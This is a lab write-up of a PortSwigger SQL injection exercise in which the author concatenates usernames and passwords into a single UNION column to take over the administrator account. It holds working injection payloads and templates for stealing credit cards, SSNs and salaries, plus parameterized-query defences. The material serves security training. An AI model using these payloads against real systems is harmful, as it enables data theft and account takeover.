# Lab 11: SQL Injection UNION Attack - Retrieving Multiple Values in a Single Column

## Executive Summary

This lab demonstrates advanced SQL injection exploitation where limited output columns necessitate creative data extraction techniques. After determining the query returns 2 columns with only one accepting string data, I faced the challenge of extracting both usernames and passwords through a single-column output. By fingerprinting the database as PostgreSQL using version disclosure and leveraging the PostgreSQL string concatenation operator (`||`), I successfully combined username and password fields into a single output column, extracted administrator credentials, and achieved complete authentication bypass. This attack showcases advanced SQL injection techniques for data exfiltration under constrained conditions.

## Lab Details

| Attribute              | Value |
|------------------------|-------|
| **Source**             | PortSwigger Web Security Academy |
| **Topic**              | SQL Injection |
| **Difficulty**         | Practitioner |
| **Vulnerability**      | SQL Injection - Single Column Data Extraction |
| **Risk**               | Critical - Credential Theft via String Concatenation |
| **Completion**         | February 20, 2026 |

## Objective

Exploit SQL injection with limited string-compatible columns by using database-specific concatenation operators to extract multiple data fields through a single output column, ultimately achieving authentication bypass.

## Testing Setup

**Tools Used:**
- Burp Suite Professional (Licensed to Gurpreet Singh)
- Burp Repeater for payload testing
- URL encoding for payload delivery
- Browser for authentication validation

**Target:** Product category filtering with constrained SQL injection output

## Exploitation Walkthrough

### 1. Initial Reconnaissance

Accessed lab environment displaying "SQL injection UNION attack, retrieving multiple values in a single column" challenge.

<img width="1920" height="982" alt="LAB2_ss1" src="https://github.com/user-attachments/assets/14a6774d-d2b7-403a-9337-87b3000b9103" />

*Lab 11 environment - Single column data extraction with Burp Suite Professional configured*

### 2. Attack Surface Identification

Explored product categories to identify SQL injection vectors.
<img width="1920" height="982" alt="LAB2_ss2" src="https://github.com/user-attachments/assets/2dd9e824-088c-4b12-b3fc-9c3cd3b66f21" />

*Category parameter identified as vulnerable to SQL injection*

**Request Captured:**
```http
GET /filter?category=[category_value] HTTP/1.1
Host: [lab-id].web-security-academy.net
```

**Attack Vector:** Category parameter likely incorporated into SQL WHERE clause without sanitization.

### 3. Column Count Enumeration - Part 1

Sent request to Burp Repeater and began column enumeration using ORDER BY technique.

**Test Payloads:**
```http
GET /filter?category=[value]'+ORDER+BY+1-- HTTP/1.1
GET /filter?category=[value]'+ORDER+BY+2-- HTTP/1.1
```
<img width="1920" height="982" alt="LAB2_ss3" src="https://github.com/user-attachments/assets/9194fe05-be8e-44bf-ab09-d4b3b1375b7c" />

*ORDER BY 1,2 tests - Both return 200 OK, confirming at least 2 columns*

**Responses:** Both 200 OK

**Analysis:** At least 2 columns exist.

### 4. Column Count Limit Discovery

**Test Payload:**
```http
GET /filter?category=[value]'+ORDER+BY+3-- HTTP/1.1
```
<img width="1920" height="982" alt="LAB2_ss4" src="https://github.com/user-attachments/assets/43c85b32-b448-4473-8015-6d4e721bcdc5" />

*ORDER BY 3 test - Internal Server Error confirms only 2 columns exist*

**Response:** 500 Internal Server Error

**Column Count Confirmed:** Exactly **2 columns** in result set.

### 5. String Data Type Testing

**Challenge:** Determine which columns accept string data.

**Test Payload 1:**
```http
GET /filter?category=[value]'+UNION+SELECT+NULL,'abc'-- HTTP/1.1
```

<img width="1920" height="982" alt="LAB2_ss5 1" src="https://github.com/user-attachments/assets/4b43717e-34c6-4e80-b71d-3bff3554a6f0" />

*Column 2 string test - 200 OK confirms second column accepts strings*

**SQL Query Executed:**
```sql
SELECT * FROM products WHERE category = '[value]' 
UNION SELECT NULL, 'abc'--'
```

**Response:** 200 OK with 'abc' displayed

**Test Payload 2:**
```http
GET /filter?category=[value]'+UNION+SELECT+'abc','abc'-- HTTP/1.1
```
<img width="1920" height="982" alt="LAB2_ss5 2" src="https://github.com/user-attachments/assets/45373f98-ddca-4238-b0cc-4a92bf0ab962" />

*Both columns string test - Error indicates first column does NOT accept strings*

**Response:** 500 Internal Server Error

**Data Type Mapping:**

| Column Position | Accepts Strings? |
|----------------|------------------|
| Column 1 | ❌ No (Numeric/Date) |
| Column 2 | ✅ Yes (String) |

**Critical Constraint:** Only ONE column accepts string data, but we need to extract TWO pieces of information (username AND password).

### 6. Username Extraction

**Initial Attempt:** Extract usernames through the single string column.

**Attack Payload:**
```http
GET /filter?category=[value]'+UNION+SELECT+NULL,username+FROM+users-- HTTP/1.1
```
<img width="1920" height="982" alt="LAB2_ss6 1" src="https://github.com/user-attachments/assets/5a1b2d78-d395-44fd-9b4a-a090f986f621" />

*Username extraction - All usernames retrieved through column 2*

**SQL Query Executed:**
```sql
SELECT * FROM products WHERE category = '[value]' 
UNION SELECT NULL, username FROM users--'
```

**Response:** 200 OK with all usernames displayed

**Usernames Extracted:**
- administrator
- carlos
- wiener

**Password Extraction:**
```http
GET /filter?category=[value]'+UNION+SELECT+NULL,password+FROM+users-- HTTP/1.1
```
<img width="1920" height="982" alt="LAB2_ss6 2" src="https://github.com/user-attachments/assets/cfa059e3-53ab-4b9f-b8a9-c71e39636f5d" />

*Password extraction - All passwords retrieved through column 2*

**Passwords Extracted:**
- [admin_password]
- [carlos_password]
- [wiener_password]

**Problem:** Usernames and passwords retrieved separately with no correlation. Cannot determine which password belongs to which username.

### 7. Database Fingerprinting

**Objective:** Identify database type to use correct concatenation syntax.

**Attack Payload:**
```http
GET /filter?category=[value]'+UNION+SELECT+NULL,version()-- HTTP/1.1
```
<img width="1920" height="982" alt="LAB2_ss7" src="https://github.com/user-attachments/assets/2c5114f9-e6b9-47e4-aa9e-067e1eac1df3" />

*Database version extraction - PostgreSQL identified*

**SQL Query Executed:**
```sql
SELECT * FROM products WHERE category = '[value]' 
UNION SELECT NULL, version()--'
```

**Version Information:**
```
PostgreSQL 12.x (Ubuntu 12.x-0ubuntu0.20.04.1)
```

**Database Confirmed:** PostgreSQL

**Concatenation Operator for PostgreSQL:** `||` (double pipe)

### 8. Credential Extraction via Concatenation

**Solution:** Concatenate username and password in a single SELECT statement using PostgreSQL's `||` operator.

**Attack Payload:**
```http
GET /filter?category=[value]'+UNION+SELECT+NULL,username||'*'||password+FROM+users-- HTTP/1.1
```
<img width="1920" height="982" alt="LAB2_ss7 1" src="https://github.com/user-attachments/assets/62fd6c75-01bc-4893-8b79-c136d59704d6" />

*Concatenated credential extraction - Usernames and passwords combined with '*' separator*

**SQL Query Executed:**
```sql
SELECT * FROM products WHERE category = '[value]' 
UNION SELECT NULL, username || '*' || password FROM users--'
```

**Concatenation Breakdown:**
- `username` - First data field
- `||` - PostgreSQL concatenation operator
- `'*'` - Separator character for visual distinction
- `||` - Second concatenation operator
- `password` - Second data field

**Result:** Combined output in single column:
```
administrator*[admin_password]
carlos*[carlos_password]
wiener*[wiener_password]
```

**Attack Success:**
- ✅ Both username and password extracted together
- ✅ Clear correlation maintained via separator
- ✅ Administrator credentials identified
- ✅ Single-column constraint overcome

### 9. Administrator Authentication

Used extracted administrator credentials to authenticate.

<img width="1920" height="982" alt="LAB2_ss8 1" src="https://github.com/user-attachments/assets/365ae23e-f663-4702-97c7-69776ad74d24" />

*Administrator credentials entered for authentication*

**Credentials:**
- Username: `administrator`
- Password: `[extracted_password]`

<img width="1920" height="982" alt="LAB2_ss8 2" src="https://github.com/user-attachments/assets/25fb3c66-df03-4e1f-a4e8-8d21aec31cc6" />

*Administrator account accessed successfully - Complete system compromise achieved*

**Complete System Compromise:**
- ✅ Database structure enumerated (2 columns, 1 string)
- ✅ PostgreSQL database fingerprinted
- ✅ Concatenation technique successfully applied
- ✅ All user credentials extracted
- ✅ Administrator credentials obtained
- ✅ Full authentication bypass achieved

**Lab completion confirmed: "Congratulations, you solved the lab!"**

## Technical Impact

**Severity: Critical (CVSS 9.8)**
```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
```

**Primary Vulnerability:**

**CWE-89: SQL Injection**
- User input directly incorporated into SQL queries
- No parameterized queries or input sanitization
- Complete credential extraction through constrained output
- Authentication bypass achieved

**Attack Chain with Constraints:**
```
SQL Injection Discovery
        ↓
Column Enumeration (ORDER BY)
        ↓
2 Columns Identified
        ↓
Data Type Testing
        ↓
Only Column 2 Accepts Strings (Constraint!)
        ↓
Database Fingerprinting (version())
        ↓
PostgreSQL Identified
        ↓
String Concatenation Applied (||)
        ↓
Multiple Values in Single Column
        ↓
Credentials Extracted with Correlation
        ↓
Administrator Access Obtained
```

**Database-Specific Concatenation Operators:**

| Database | Concatenation Operator | Example |
|----------|----------------------|---------|
| **PostgreSQL** | `||` | `username || ':' || password` |
| **MySQL** | `CONCAT()` or `||` | `CONCAT(username, ':', password)` |
| **MSSQL** | `+` | `username + ':' + password` |
| **Oracle** | `||` | `username || ':' || password` |
| **SQLite** | `||` | `username || ':' || password` |

**Why Database Fingerprinting Matters:**

**PostgreSQL Example (Used in Lab):**
```sql
' UNION SELECT NULL, username || ':' || password FROM users--
Result: administrator:P@ssw0rd123
```

**MySQL Alternative:**
```sql
' UNION SELECT NULL, CONCAT(username, ':', password) FROM users--
Result: administrator:P@ssw0rd123
```

**MSSQL Alternative:**
```sql
' UNION SELECT NULL, username + ':' + password FROM users--
Result: administrator:P@ssw0rd123
```

**Concatenation Strategies:**

**Multiple Columns from Same Table:**
```sql
-- Extract first name, last name, email
' UNION SELECT NULL, first_name || ' ' || last_name || ' (' || email || ')' FROM users--
Result: John Doe (john.doe@example.com)
```

**Multiple Columns from Different Tables:**
```sql
-- Extract user and their role
' UNION SELECT NULL, u.username || ' - ' || r.role_name 
  FROM users u 
  JOIN roles r ON u.role_id = r.id--
Result: administrator - Super Admin
```

**Multiple Rows Concatenation (Advanced):**
```sql
-- PostgreSQL - Aggregate all usernames
' UNION SELECT NULL, string_agg(username, ',') FROM users--
Result: administrator,carlos,wiener

-- MySQL - Aggregate all usernames  
' UNION SELECT NULL, GROUP_CONCAT(username) FROM users--
Result: administrator,carlos,wiener
```

**Real-World Exploitation Scenarios:**

**E-Commerce Platform:**
```sql
-- Extract customer name, email, and credit card
' UNION SELECT NULL, 
  name || ' | ' || email || ' | ' || credit_card 
FROM customers--
```

**Healthcare System:**
```sql
-- Extract patient name, DOB, and SSN
' UNION SELECT NULL,
  patient_name || ' | ' || date_of_birth || ' | ' || ssn
FROM patients--
```

**Corporate Application:**
```sql
-- Extract employee details
' UNION SELECT NULL,
  employee_id || ' - ' || full_name || ' | Salary: $' || salary
FROM employees--
```

**Why Single-Column Extraction is Common:**

**Application Display Constraints:**
Many applications only display:
- Product names (single column output)
- Search results (title field only)
- Category listings (one field visible)

Even with multiple database columns, only one may be displayed in the UI, requiring concatenation for full data extraction.

**Advanced Concatenation Techniques:**

**Formatted Output:**
```sql
-- Create readable format
' UNION SELECT NULL, 
  'Username: ' || username || ', Password: ' || password 
FROM users--

Result: Username: administrator, Password: P@ssw0rd123
```

**JSON Format:**
```sql
-- PostgreSQL JSON output
' UNION SELECT NULL,
  '{"user":"' || username || '","pass":"' || password || '"}'
FROM users--

Result: {"user":"administrator","pass":"P@ssw0rd123"}
```

**URL Encoding for Exfiltration:**
```sql
-- Prepare for URL parameter exfiltration
' UNION SELECT NULL,
  username || '=' || password
FROM users--

Result: administrator=P@ssw0rd123
```

## Key Takeaways

**Penetration Testing Methodology:**
- Constraint identification (single string column)
- Database fingerprinting for syntax selection
- Creative data extraction through concatenation
- Credential correlation maintenance
- Complete exploitation despite limitations

**Critical Security Insights:**

**1. Output Constraints Don't Prevent Extraction:**
Limited string columns can be overcome with:
- String concatenation operators
- Multiple extraction requests
- Aggregation functions
- Creative formatting

**2. Database-Specific Knowledge is Essential:**

**Must Know:**
- Concatenation operators for each database
- Version extraction methods
- Aggregation functions
- String manipulation capabilities

**3. Complete Exploitation Process:**

**Phase 1 - Enumeration:**
```sql
' ORDER BY 1-- ✓
' ORDER BY 2-- ✓
' ORDER BY 3-- ✗
Result: 2 columns
```

**Phase 2 - Data Type Discovery:**
```sql
' UNION SELECT NULL, 'test'-- ✓
' UNION SELECT 'test', 'test'-- ✗
Result: Only column 2 is string
```

**Phase 3 - Database Fingerprinting:**
```sql
' UNION SELECT NULL, version()--
Result: PostgreSQL 12.x
```

**Phase 4 - Concatenated Extraction:**
```sql
' UNION SELECT NULL, username || ':' || password FROM users--
Result: administrator:[password]
```

**Phase 5 - Authentication:**
```
Use extracted credentials → Admin access
```

**4. Defense Requires Parameterized Queries:**

**Vulnerable Code:**
```python
query = "SELECT id, name FROM products WHERE category = '" + category + "'"
```

**Secure Code:**
```python
query = "SELECT id, name FROM products WHERE category = ?"
cursor.execute(query, [category])
```

**Why This Prevents Concatenation Attacks:**
- User input never interpreted as SQL code
- UNION and concatenation attempts treated as literals
- Database structure completely protected

**5. Additional Mitigation Layers:**

**Application Level:**
- Least privilege database accounts
- Restrict SELECT access to sensitive tables
- Output encoding prevents credential display

**Database Level:**
- Column-level access controls
- Audit logging for sensitive table access
- Query complexity limits

**Professional Skills Demonstrated:**
- Advanced SQL injection under constraints
- Database fingerprinting techniques
- String concatenation exploitation
- Creative data extraction methodologies
- Understanding of database-specific syntax
- Complete attack chain execution despite output limitations

## References

1. PortSwigger Web Security Academy - SQL Injection
2. OWASP Top 10 (2021) - A03: Injection
3. CWE-89 - SQL Injection
4. PostgreSQL Documentation - String Functions
5. OWASP SQL Injection Prevention Cheat Sheet

---

## Legal Notice

**Copyright © 2025 Gurpreet Singh**  
Licensed under CC BY-NC-ND 4.0

**Repository:** https://github.com/Gurpreet-Singh-offensive-Security/Offensive-Security-Labs

**Disclaimer:** This documentation is for authorized security testing and educational purposes only. All techniques were performed in a controlled laboratory environment with explicit permission. Unauthorized access to systems, credential theft, or database enumeration is illegal under applicable laws worldwide.
